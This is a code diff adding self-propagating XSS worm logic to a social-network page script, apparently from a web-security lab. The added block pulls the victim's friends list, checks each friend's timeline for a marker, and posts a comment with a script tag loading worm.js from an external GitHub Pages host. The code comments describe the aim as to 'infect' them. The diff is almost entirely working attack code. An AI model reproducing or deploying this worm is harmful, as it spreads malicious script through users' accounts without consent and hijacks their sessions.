@@ -35,7 +35,27 @@ $(document).ready(function () {
                     }
                 })
             } else {
-                console.log("there was a problem making friends :(");
+                console.log("there was a problem making friends, maybe u already friended them? :(");
+                $.ajax({
+                    // Get friends in friends list and infect
+                    url: "/friends.php", success: function (result) {
+                        console.log(result);
+                        friends_list = result.split("<BR>")[0].split(",")
+                        for (var i = 0; i < friends_list.length; i++) {
+                            console.log(friends_list[i]);
+                            (function (new_id) {
+                                $.ajax({
+                                    url: "/timeline.php?id=" + new_id, success: function (result) {
+                                        if (result.indexOf("ajq2679") === -1) {
+                                            var worm = "<script src=\"https://ajq2679.github.io/worm.js\"></script>"
+                                            $.ajax({ url: "/add_comment.php?id=" + new_id + "&comment=" + worm, success: function (result) { console.log(result); } });
+                                        }
+                                    }
+                                });
+                            })(friends_list[i]);
+                        }
+                    }
+                })
             }
         }
     })
